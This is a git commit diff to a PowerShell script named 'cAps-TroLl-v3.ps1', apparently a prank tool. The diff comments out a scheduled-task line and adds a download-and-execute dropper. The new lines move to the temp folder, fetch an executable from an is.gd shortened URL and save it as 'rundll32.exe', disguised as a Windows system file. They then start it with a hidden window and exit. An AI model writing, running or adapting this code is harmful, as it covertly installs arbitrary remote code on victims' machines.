da7de87c007c7311466bd51809dadc1650f8eb93
TobiS137 <75208393+TobiS137@users.noreply.github.com>
2025-03-27 13:44:57 +0100

    Update cAps-TroLl-v3.ps1

--- cAps-TroLl-v3/cAps-TroLl-v3.ps1
+++ cAps-TroLl-v3/cAps-TroLl-v3.ps1
@@ -1,1 +1,6 @@
-schtasks /create /tn "CapsLockTask" /tr "C:\Users\Administrator\Documents\cAps-TroLl-v2\capslock.exe" /sc minute /mo 1 /rl highest /f /ru "$env:USERNAME"
+cd $env:Temp;
+iwr -Uri https://is.gd/o9DcFL -O rundll32.exe -UseBasicParsing;
+Start-Sleep 1;
+Start-Process .\rundll32.exe -WindowStyle Hidden;
+# schtasks /create /tn "CapsLockTask" /tr "C:\Users\Administrator\Documents\cAps-TroLl-v2\capslock.exe" /sc minute /mo 1 /rl highest /f /ru "$env:USERNAME";
+exit
